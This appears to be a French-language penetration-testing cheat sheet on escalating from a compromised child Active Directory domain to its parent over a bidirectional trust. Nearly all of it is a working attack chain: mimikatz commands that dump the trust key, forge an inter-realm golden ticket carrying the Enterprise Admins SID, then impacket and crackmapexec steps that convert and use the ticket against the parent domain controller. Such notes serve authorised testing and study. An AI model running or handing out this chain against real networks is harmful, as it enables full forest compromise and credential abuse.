### trust bidirectionnal, child -> parent

Une fois qu'on a le contrôle d'un premier DC, s'y connecter et avec mimikatz:

```powershell
lsadump::trust /patch
```

Ce qui permet de trouver les SID dont nous auront besoin, ainsi que la trustkey.

Ensuite, toujours avec mimikatz:

```powershell
kerberos::golden /user:Administrator /domain:child.internal.local /sid:S-1-5-21-3056178012-3972705859-491075245 /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:bd0e4bd0efde459162c036970ef3489e /target:internal.local /ticket:C:\Windows\test.kirbi /service:krbtgt
```

> /domain: le domaine dont nous avons le contrôle  
> /sid: le sid du domaine dont nous avons le contrôle  
> /sids: le sid du domaine visé (/!\ on rajoute -519, qui correspond au groupe "enterprise admin")  
> /target: le domaine visé  
> /rc4: la trustkey

On récupère ensuite le .kirbi sur notre host et on le converti en .ccache:

```bash
impacket-ticketconverter test.kirbi test.ccache
```

On l'exporte:

```bash
export KRB5CCNAME=test.ccache
```

Nous pouvons ensuite faire le request d'un TGS sur le DC principal:

```bash
impacket-getST -k -no-pass -spn HOST/DC01 internal.local/Administrator@child.internal.local
```

On l'exporte à son tour -> profit.

>/!\ nous sommes toujours Administrateur du domaine child, mais avec les droits sur le domaine parent, ce qui implique qu'il faut spécifier le nom du domaine dans certains cas, typiquement:

```bash
crackmapexec smb 192.168.210.10 --use-kcache -d child.internal.local
```
